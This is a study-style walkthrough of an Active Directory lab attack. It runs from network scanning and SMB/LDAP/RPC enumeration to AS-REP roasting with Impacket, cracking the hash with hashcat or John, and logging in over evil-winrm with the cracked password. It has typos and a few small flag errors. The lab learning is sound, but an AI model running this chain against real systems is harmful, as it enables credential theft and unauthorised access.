# 1) Check for installed arp-scann
# arp-schan sends ARP requests to all of IP addresses on a local network.

sudo apt update
sudo apt install arp-scan

# 2) Run the provided scripth that scans each network adapter

The script runs a simple one line commant that scans each networ adapter, to check for an IP

If the script can`t be exectued change the premistion, so that the file is executable:
chmod +x arp-scan.sh


# 3) Run nmap (Network Mapper) that scans the retturned ip addresses
Network exploration tool and security / port scanner

nmap -sV -sC -vv -p- -Pn <<IP>>

-sV: Probe open ports to determine service/version info
-sC: Scans for scripts (These scripts check for common vulnerabilities, gather information, and perform basic security checks)
-vv: Incrises verosity level (Gives more detailed inforamation)
-p-: Scans for specific port (scans all default port ranges)

What did i learn from the scan?

The Nmap scan results provide a detailed picture of the system and the network services it’s running. For example, port 53 is open and running Simple DNS Plus, which handles translating domain names into IP addresses—a fundamental part of how the internet works. Port 88 shows that Microsoft Windows Kerberos is active, which is used for secure authentication across the network. This also gives us a server timestamp, which is helpful for checking if the system’s clock is synced.
Port 135 is tied to Microsoft Windows RPC, a service that allows different programs to communicate with each other, either on the same machine or across the network. Ports 139 and 445 are significant because they indicate NetBIOS and SMB (Server Message Block) are running, protocols commonly used for sharing files and printers in a Windows environment. The presence of LDAP services on ports 389 and 3268 tells us this system is likely part of an Active Directory domain, where LDAP helps manage users, computers, and resources.
We also see HTTP services running on ports like 5985 and 47001, specifically Microsoft’s HTTPAPI, which supports tasks like remote server management. Another interesting service on port 9389 is .NET Message Framing, which is part of how Microsoft systems handle communications in distributed applications. Additionally, the scan reveals a lot of activity on RPC ports, which are essential for the system’s administrative and functional tasks.
Security checks indicate the system is clean of the Conficker worm, which is reassuring. The SMB configurations also show that message signing is enabled and required, which adds a layer of protection to file-sharing operations. From the host scripts, we can see the machine’s NetBIOS name and group details, as well as that it’s running in a virtualized environment using Oracle VirtualBox.
Altogether, the scan paints the picture of a Windows server operating in an Active Directory domain. It’s configured with a range of services for authentication, file sharing, directory access, and remote management, which suggests it’s a well-rounded setup typical for many networked environments.

# 4) smbmap is a tool designed for enumerating SMB shares and their permissions.

smbmap -H 192.168.56.107

# 5) Enum4linux-ng is a tool used for gathering information from Windows systems via SMB (Server Message Block) and NetBIOS protocols. 

enum4linux-ng 192.168.56.107

# 6) crackmapexec can enumerate SMB shares, users, and domain information.

crackmapexec smb 192.168.56.107

# 7) Evaluation on what I learned from the scanns

So after running bouth 4 scanns I learned that the 2 most usefull were nmap and Enum4linux-ng. 
The scan revealed that the target is part of the SKYPIA domain, running Windows Server 2019 (or a similar OS version) with SMB signing required and modern SMB protocols supported (SMB 2.02 to SMB 3.1.1). However, access to detailed user, group, share, and policy information was mostly denied, indicating restricted permissions for unauthenticated sessin.
We can pull donw users using ldap or msrpc

# 8) running smbclient 

smbclient -L 192.168.56.107 -U "" 
For prottection I will have to setup so you cant log in anonymostly. At the moment when I run it I get acsses to the fileshare workgrop 

# 9) rpcclient 

rpcclient -N -U '' 192.168.56.107 
-U is for user
-N is for password ignore

after we are in the rpcclient comand line we can run enumdomusers
but we get permision denied.
We get users now lets try:

# ldapsearch
First we need to get the domain naim if nmap did not output
389/tcp   open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: skypia.or>
it we can try:
ldapsearch -H ldap://192.168.56.107 -x -s base namingcontext 

after that we can run:
ldapsearch -H ldap://192.168.56.107 -x -b"DC=skypia,DC=org" 

we get some useful inforamtion like some account names...

but we are after an objectClass(sAMAccountName):

ldapsearch -H ldap://192.168.56.107 -x -b"DC=skypia,DC=org"  '(objectClass=User)' "sAMAccountName"| grep "sAMAccountName" 

We got the same usernames as we would get if ldapsearc would not be protected

# 10) running Impacket and then hashcat on the hashes of the password

impacket-GetNPUsers -dc-ip 192.168.56.107 -request 'skypia.org/'

First run sudo gunzip /usr/share/wordlists/rockyou.txt.gz

hashcat hash-jemmie.txt /usr/share/wordlists/rockyou.txt 

after running we get the last word of hash(password) (winter) for jammie

or you can use john the reaper so you are sure that the password is the same

└─$ john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt poskus1.txt 

# 11) rpcclient with the user and password now outputs other enumereted users that were hidden before

└─$ rpcclient -U "jemmie.blondell" 192.168.56.107

# 12) Log in with evil-winrm 

└─$ evil-winrm -i 192.168.56.107 -u jemmie.blondell

After the succest I could check users computer.

# 13) We can alsow check what permisons we have with 

smbmap -H 192.168.56.107  -u "jemmie.blondell" -p winter

now that we have a user 

# 14) we explore and check if any other user has more permisons 
we can accses that directory with smbclient 
smbclient //192.168.56.107/ -U "jemmie.blondell"
